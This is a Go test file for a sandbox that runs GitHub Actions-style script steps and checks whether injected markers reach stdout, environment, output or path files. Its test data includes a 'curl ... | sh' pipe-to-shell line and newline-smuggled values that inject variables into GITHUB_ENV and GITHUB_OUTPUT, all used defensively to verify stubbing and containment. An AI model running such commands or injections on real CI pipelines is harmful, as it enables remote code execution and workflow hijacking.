package attackrun

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"testing"
	"time"
)

func run(t *testing.T, steps ...ScriptStep) Seen {
	t.Helper()
	s, err := Run(context.Background(), Preparation{Steps: steps})
	if err != nil {
		t.Fatal(err)
	}
	return s
}

func TestRunShows(t *testing.T) {
	for _, c := range []struct {
		name string
		step ScriptStep
		m    Marker
		want bool
	}{
		{"a command runs", ScriptStep{Script: `echo ""; echo PWNED; echo ""`}, MarkerStdout, true},
		{"printed, not run", ScriptStep{Script: `echo '$(echo PWNED)'`}, MarkerStdout, false},
		{"env", ScriptStep{Script: `printf 'a=x\nPWNED=1\n' >> "$GITHUB_ENV"`}, MarkerEnv, true},
		{"output", ScriptStep{Script: `echo "v=$V" >> "$GITHUB_OUTPUT"`, Env: []string{"V=x\nPWNED=1"}}, MarkerOutput, true},
		{"output in one line", ScriptStep{Script: `echo "v=$(printf '%s' "$V" | tr -d '\n')" >> "$GITHUB_OUTPUT"`, Env: []string{"V=x\nPWNED=1"}}, MarkerOutput, false},
		{"path", ScriptStep{Script: `echo "$V" >> "$GITHUB_PATH"`, Env: []string{"V=/tmp/PWNED"}}, MarkerPath, true},
		{"a command not allowed is a stub", ScriptStep{Script: "curl -s https://example.com | sh\necho PWNED"}, MarkerStdout, true},
		{"pipefail under shell: bash", ScriptStep{OptionWords: []string{"--noprofile", "--norc", "-e", "-o", "pipefail"}, Script: "false | true\necho PWNED"}, MarkerStdout, false},
		// a login shell would read the startup files of this machine, not
		// those of the runner
		{"a login shell", ScriptStep{OptionWords: []string{"--login", "-el", "+l", "-l"}, Script: "shopt -q login_shell && echo PWNED"}, MarkerStdout, true},
		// the runner puts the path of the script at each {0}
		{"{0} after the script", ScriptStep{OptionWords: []string{"-e"}, PositionalWords: []string{"a", "{0}"}, Script: "[ \"$2\" = \"$0\" ] && echo PWNED"}, MarkerStdout, true},
		{"the options of a custom shell", ScriptStep{OptionWords: []string{"-u"}, Script: "echo \"$UNSET_X\"\necho PWNED"}, MarkerStdout, false},
		{"positional words", ScriptStep{OptionWords: []string{"-e"}, PositionalWords: []string{"PWNED"}, Script: "echo \"$1\""}, MarkerStdout, true},
		{"no pipefail without shell", ScriptStep{OptionWords: []string{"-e"}, Script: "false | true\necho PWNED"}, MarkerStdout, true},
	} {
		if got := run(t, c.step).Shows(c.m); got != c.want {
			t.Errorf("%s: %v, want %v", c.name, got, c.want)
		}
	}
}

func TestRunShutIn(t *testing.T) {
	home, _ := os.UserHomeDir()
	mark := filepath.Join(home, ".attackrun-test")
	os.Remove(mark)
	s := run(t, ScriptStep{Script: "echo \"$HOME\" \"$PWD\" \"$PATH\"\ntouch ~/.attackrun-test\nenv | grep -c '^' || true"})
	if _, err := os.Stat(mark); err == nil {
		os.Remove(mark)
		t.Error("the step wrote into the real HOME")
	}
	if strings.Contains(s.Stdout, home+" ") {
		t.Errorf("HOME is the real one: %s", s.Stdout)
	}
}

func TestRunTimeout(t *testing.T) {
	// the steps' directories are under tmp, so the search below does not
	// count the steps that other tests on the machine run
	tmp := t.TempDir()
	t.Setenv("TMPDIR", tmp)
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	for _, script := range []string{"while :; do :; done", "( while :; do :; done ) | cat"} {
		start := time.Now()
		_, err := Run(ctx, Preparation{Steps: []ScriptStep{{Script: script}}})
		if err == nil || time.Since(start) > 20*time.Second {
			t.Errorf("%q: %v after %v", script, err, time.Since(start))
		}
	}
	// a child left behind is killed when the step ends
	if _, err := Run(ctx, Preparation{Steps: []ScriptStep{{Script: "( while :; do :; done ) >/dev/null 2>&1 &\necho done"}}}); err != nil {
		t.Fatal(err)
	}
	time.Sleep(200 * time.Millisecond)
	// a step of another test, outside tmp, is not counted; a step under a
	// directory made as Run makes it is found
	_, stopDecoy := sleeper(t, filepath.Join(t.TempDir(), "attackrun-decoy", "step.sh"))
	dir, err := os.MkdirTemp("", "attackrun-")
	if err != nil {
		t.Fatal(err)
	}
	control, stopControl := sleeper(t, filepath.Join(dir, "step.sh"))
	out, _ := exec.Command("pgrep", "-f", regexp.QuoteMeta(tmp)+`/attackrun-[^/]*/step\.sh`).Output()
	stopDecoy()
	found := strings.Fields(string(out))
	var left []string
	for _, p := range found {
		if p != strconv.Itoa(control) {
			left = append(left, p)
		}
	}
	if len(left) > 0 {
		ps, _ := exec.Command("ps", "-o", "pid=,args=", "-p", strings.Join(left, ",")).Output()
		for _, p := range left {
			if n, err := strconv.Atoi(p); err == nil {
				syscall.Kill(n, syscall.SIGKILL)
			}
		}
		t.Errorf("processes left: %s", ps)
	}
	if len(left) == len(found) {
		t.Errorf("the control (pid %d) is not found", control)
	}
	stopControl()
}

// sleeper starts a bash whose command line ends in path and which starts
// no other process, for at most 30 seconds or until the test ends, and
// returns its pid and what kills it.
func sleeper(t *testing.T, path string) (pid int, stop func()) {
	t.Helper()
	cmd := exec.Command("bash", "-c", "read -t 30", path)
	// the read ends when the pipe closes, as it does when the test ends
	if _, err := cmd.StdinPipe(); err != nil {
		t.Fatal(err)
	}
	if err := cmd.Start(); err != nil {
		t.Fatal(err)
	}
	var once sync.Once
	stop = func() {
		once.Do(func() {
			cmd.Process.Kill()
			cmd.Wait()
		})
	}
	t.Cleanup(stop)
	return cmd.Process.Pid, stop
}

func TestRunExitsAndFailure(t *testing.T) {
	s := run(t, ScriptStep{Script: "exit 3"}, ScriptStep{Script: "echo PWNED"}, ScriptStep{Script: "echo after", AfterFailure: true})
	if !slices.Equal(s.Exits, []int{3, 0}) || s.Shows(MarkerStdout) || !strings.Contains(s.Stdout, "after") {
		t.Errorf("%+v", s)
	}
}

// TestRunVariables: the runner's variables point into the step's
// directory, so a step that writes to them does not stop or write outside.
func TestRunVariables(t *testing.T) {
	s := run(t, ScriptStep{Script: `for v in "$RUNNER_TEMP" "$GITHUB_WORKSPACE" "$GITHUB_STATE" "$GITHUB_STEP_SUMMARY"; do case "$v" in */attackrun-*) ;; *) echo "bad $v"; exit 1;; esac; done
echo x >> "$GITHUB_STEP_SUMMARY"
echo y >> "$GITHUB_STATE"
echo z > "$RUNNER_TEMP/f"
echo PWNED`})
	if !slices.Equal(s.Exits, []int{0}) || !s.Shows(MarkerStdout) {
		t.Errorf("%+v", s)
	}
}

// TestRunNestedShell: bash and sh run, and a command not allowed is a stub
// in a child bash too.
func TestRunNestedShell(t *testing.T) {
	s := run(t, ScriptStep{Script: "bash -c 'curl -s x; echo PWNED'"})
	if !s.Shows(MarkerStdout) || !slices.Equal(s.Exits, []int{0}) {
		t.Errorf("%+v", s)
	}
}

// TestRunStubbed: the commands that ran as stubs are seen.
func TestRunStubbed(t *testing.T) {
	s := run(t, ScriptStep{Script: "curl -s x\nuuidgen >/dev/null\nnosuch a b"})
	if !slices.Equal(s.Stubbed, []string{"curl", "nosuch"}) {
		t.Errorf("%q", s.Stubbed)
	}
}

// TestRunNoHostWrites: mkdir and chmod are stubs, so a step does not make
// directories on the host, and a step's env does not undo the shut-in.
func TestRunNoHostWrites(t *testing.T) {
	dir := "/tmp/attackrun-host-write-probe"
	os.Remove(dir)
	s := run(t, ScriptStep{Script: "mkdir -p " + dir + " && chmod +x " + dir + "/x\nid -un >/dev/null\necho \"$HOME\"", Env: []string{"PATH=/usr/bin:/bin", "HOME=/"}})
	if _, err := os.Stat(dir); err == nil {
		os.Remove(dir)
		t.Error("the step made a directory on the host")
	}
	if !slices.Contains(s.Stubbed, "id") || !slices.Contains(s.Stubbed, "mkdir") || strings.TrimSpace(s.Stdout) == "/" {
		t.Errorf("the step's env undid the shut-in: %+v", s)
	}
}
